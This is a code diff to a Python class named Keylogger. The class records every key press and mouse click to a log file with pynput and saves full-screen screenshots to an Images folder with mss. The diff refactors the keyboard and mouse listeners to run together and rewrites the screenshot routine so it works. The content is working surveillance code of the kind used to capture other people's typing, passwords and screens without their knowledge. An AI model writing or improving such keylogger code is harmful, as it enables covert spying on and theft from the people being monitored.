@@ -16,7 +16,6 @@ from ui import Application
 class Keylogger():
     def __init__(self, logging):
         self.logging = logging
-        self.sct = mss()
         self.initial()
 
     def initial(self):
@@ -27,9 +26,14 @@ class Keylogger():
             f.write('\n' + str(date.now()) + '-->')
 
     def start_logging(self):
-        with pynput.keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
-            with pynput.mouse.Listener(on_click=self.on_click) as listener:
-                listener.join()
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
+        mouse_listener = pynput.mouse.Listener(on_click=self.on_click)
+
+        keyboard_listener.start()
+        mouse_listener.start()
+
+        keyboard_listener.join()
+        mouse_listener.join()
 
     def on_press(self, key):
         self.write_file(key)
@@ -99,19 +103,19 @@ class Keylogger():
         self.current_time = time.time()
 
     def take_screenshot(self):
-        # with mss() as sct:
-        monitor = self.sct.monitors[0]
-        sct_img = self.sct.grab(monitor)
-        img = Image.frombytes('RGB', sct_img.size, sct_img.bgra, 'raw', 'BGRX')
-        
-        screenshot_stamp = str(date.now()).replace(" ", "=")
-        screenshot_stamp = screenshot_stamp.replace(":", "_")
-        
-        if not os.path.isdir('Images'):
-            os.mkdir('Images')
-        
-        save_path = f"Images\\{screenshot_stamp}.jpg"
-        img.save(save_path)
+        with mss() as sct:
+            monitor = sct.monitors[0]
+            sct_img = sct.grab(monitor)
+            img = Image.frombytes('RGB', sct_img.size, sct_img.bgra, 'raw', 'BGRX')
+            
+            screenshot_stamp = str(date.now()).replace(" ", "=")
+            screenshot_stamp = screenshot_stamp.replace(":", "_")
+            
+            if not os.path.isdir('Images'):
+                os.mkdir('Images')
+            
+            save_path = f"Images\\{screenshot_stamp}.jpg"
+            img.save(save_path)
 
     # def take_screenshot(self):
     #     image_size = (1536, 864)
